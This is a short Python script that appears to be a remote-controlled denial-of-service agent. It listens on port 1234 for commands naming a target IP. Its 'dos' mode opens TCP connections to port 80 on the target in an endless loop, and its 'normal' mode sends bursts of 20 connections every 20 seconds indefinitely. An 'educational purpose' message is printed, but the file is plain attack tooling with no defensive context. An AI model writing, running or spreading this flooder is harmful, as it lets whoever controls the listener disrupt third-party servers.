import socket
from time import sleep

def server_program():
    # initialize the server
    host = '0.0.0.0'
    port = 1234
    server_socket = socket.socket()
    server_socket.bind((host, port))

    # listen for incoming connections
    server_socket.listen(2)
    conn, address = server_socket.accept()
    print(f"Connection from {address} has been established!")

    while True:
        # receive the message from the client
        data = conn.recv(1024).decode()
        if not data:
            break

        # determine the mode and act accordingly
        if data == 'dos':
            print("DoS Only for educational purpose.")
            ip = conn.recv(1024).decode()
            dos_attack(ip)
        elif data == 'opo':
            print("One Ping Only.")
            ip = conn.recv(1024).decode()
            one_ping(ip)
        elif data == 'normal':
            print("Normal mode.")
            ip = conn.recv(1024).decode()
            normal_mode(ip)

    # close the connection
    conn.close()

def dos_attack(ip):
    # send continuous TCP packets to the target IP
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
        s.close()

def one_ping(ip):
    # send one TCP packet to the target IP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 80))
    s.close()

def normal_mode(ip):
    # send 20 TCP packets every 20 seconds to the target IP
    while True:
        for _ in range(20):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 80))
            s.close()
        sleep(20)

if __name__ == '__main__':
    server_program()
